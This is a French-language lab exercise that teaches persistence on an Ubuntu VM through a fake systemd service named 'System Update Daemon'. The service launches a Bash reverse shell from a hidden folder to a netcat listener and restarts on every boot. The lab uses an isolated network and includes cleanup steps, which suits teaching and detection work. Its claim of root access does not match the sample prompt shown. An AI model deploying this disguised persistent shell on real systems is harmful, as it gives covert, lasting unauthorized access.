
# **TP Offensif – Persistance via systemd (Reverse Shell Bash)**

**Sujet : Créer un service malveillant pour garder l’accès à une machine Ubuntu 22.04 après compromission**

---

## **1. Objectif**

* Créer un service `systemd` malveillant
* Maintenir un accès (reverse shell) après reboot
* Utiliser uniquement Bash et `systemctl`
* Observer les traces et nettoyer ensuite

---

## **2. Configuration requise**

### Machines virtuelles obligatoires

```
+------------------------+                +------------------------+
|   MACHINE KALI (Attaquant)             |<--- nc -lvnp 4444
|   IP : 192.168.56.10                   |                
+------------------------+                +------------------------+
                                                  |
                                                  |
                                                  v
+------------------------+                +------------------------+
|   MACHINE UBUNTU 22.04 (Victime)        |---> reverse shell bash
|   IP : 192.168.56.11                    |
+------------------------+                +------------------------+
```

### Réseau : `Host-only` ou `Internal Network`

> Aucun accès internet. Aucun pont réseau.

---

## **3. Préparation – Attaquant (KALI)**

### 3.1 Ouvrir le listener

Dans Kali, exécuter :

```bash
nc -lvnp 4444
```

Attendez. Ne rien fermer.

---

## **4. Préparation – Victime (Ubuntu 22.04)**

### 4.1 Installation des outils si nécessaire

```bash
sudo apt update
sudo apt install netcat-traditional systemd
```

---

## **5. Étape par Étape – Créer le Reverse Shell Bash**

### 5.1 Créer un dossier caché

```bash
sudo mkdir -p /opt/.update
```

### 5.2 Écrire le script malveillant

```bash
sudo nano /opt/.update/reverse.sh
```

Coller ce contenu :

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
```

Remplacez l’IP `192.168.56.10` par celle de Kali si différente.

### 5.3 Donner les droits d’exécution

```bash
sudo chmod +x /opt/.update/reverse.sh
```

---

## **6. Créer un faux service systemd**

### 6.1 Créer le fichier de service

```bash
sudo nano /etc/systemd/system/systemd-update.service
```

Coller ce contenu :

```ini
[Unit]
Description=System Update Daemon
After=network.target

[Service]
Type=simple
ExecStart=/opt/.update/reverse.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

---

### 6.2 Activer le service

```bash
sudo systemctl daemon-reload
sudo systemctl enable systemd-update
sudo systemctl start systemd-update
```

---

## **7. Test de connexion (Kali)**

Retourner dans le terminal Kali.
Si tout est correct, vous verrez :

```
Connection received on 192.168.56.11
bash-5.1$
```

Vous êtes connecté en root sur la victime via le service `systemd`.

---

## **8. Vérification (Ubuntu)**

### Vérifier que le service tourne :

```bash
systemctl status systemd-update
```

### Voir les logs :

```bash
journalctl -u systemd-update
```

---

## **9. Test de persistance**

### Redémarrer la machine victime :

```bash
sudo reboot
```

### Dans Kali :

Le shell devrait revenir tout seul.

---

## **10. Suppression complète (désinfection)**

### Sur la victime :

```bash
sudo systemctl stop systemd-update
sudo systemctl disable systemd-update
sudo rm /etc/systemd/system/systemd-update.service
sudo rm -rf /opt/.update/
sudo systemctl daemon-reload
```

---

## **11. Vérification finale**

```bash
systemctl list-units --type=service | grep update
```

Ne rien voir s'afficher = suppression réussie.
